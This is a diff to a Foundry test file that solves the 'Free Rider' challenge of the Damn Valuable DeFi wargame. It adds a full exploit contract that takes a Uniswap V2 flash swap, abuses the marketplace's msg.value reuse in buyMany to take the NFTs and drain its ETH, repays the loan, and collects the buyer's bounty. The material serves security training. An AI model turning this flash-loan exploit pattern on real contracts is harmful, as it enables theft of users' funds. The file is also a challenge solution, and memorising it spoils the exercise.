@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -100,6 +101,7 @@ contract FreeRider is Test {
         uniswapV2Pair = IUniswapV2Pair(
             uniswapV2Factory.getPair(address(dvt), address(weth))
         );
+        vm.label(address(uniswapV2Pair), "uniswapV2Pair");
 
         assertEq(uniswapV2Pair.token0(), address(dvt));
         assertEq(uniswapV2Pair.token1(), address(weth));
@@ -149,7 +151,24 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker, attacker);
+        Accomplice accomplice = new Accomplice(
+            uniswapV2Factory,
+            freeRiderNFTMarketplace,
+            weth,
+            freeRiderBuyer
+        );
+        vm.label(address(accomplice), "accomplice");
+        uniswapV2Pair.swap(0, 30 ether, address(accomplice), "data");
+        for (uint256 i; i < 6; i++) {
+            // vm.prank(attacker);
+            damnValuableNFT.safeTransferFrom(
+                attacker,
+                address(freeRiderBuyer),
+                i
+            );
+        }
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -180,4 +199,95 @@ contract FreeRider is Test {
             MARKETPLACE_INITIAL_ETH_BALANCE
         );
     }
+}
+
+interface IUniswapV2Callee {
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external;
+}
+
+contract Accomplice is Test, IUniswapV2Callee, IERC721Receiver {
+    IUniswapV2Factory internal uniswapV2Factory;
+    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+    WETH9 internal weth;
+    FreeRiderBuyer internal freeRiderBuyer;
+    address attacker;
+
+    constructor(
+        IUniswapV2Factory _uniswapV2Factory,
+        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
+        WETH9 _weth,
+        FreeRiderBuyer _freeRiderBuyer
+    ) {
+        uniswapV2Factory = _uniswapV2Factory;
+        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
+        weth = _weth;
+        freeRiderBuyer = _freeRiderBuyer;
+        attacker = msg.sender;
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        address token1 = IUniswapV2Pair(msg.sender).token1();
+        assert(
+            msg.sender ==
+                IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1)
+        );
+        uint256[] memory tokensToBuy = new uint256[](6);
+        for (uint256 i; i < 6; i++) tokensToBuy[i] = i;
+
+        weth.withdraw(30 ether);
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokensToBuy);
+
+        // put up two tokens for sale and buy them yourself to extract remaining 15eth in contract
+        uint256[] memory NFTsForSell = new uint256[](2);
+        uint256[] memory NFTsPrices = new uint256[](2);
+        for (uint8 i = 0; i < 2; i++) {
+            NFTsForSell[i] = i;
+            NFTsPrices[i] = 15 ether;
+        }
+
+        freeRiderNFTMarketplace.token().approve(
+            address(freeRiderNFTMarketplace),
+            0
+        );
+        freeRiderNFTMarketplace.token().approve(
+            address(freeRiderNFTMarketplace),
+            1
+        );
+        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsForSell);
+        weth.deposit{value: 30090300000000000000}();
+        weth.transfer(
+            IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1),
+            30090300000000000000
+        );
+        for (uint256 i; i < 6; i++)
+            freeRiderNFTMarketplace.token().safeTransferFrom(
+                address(this),
+                attacker,
+                i
+            );
+        payable(attacker).call{value: address(this).balance}("");
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
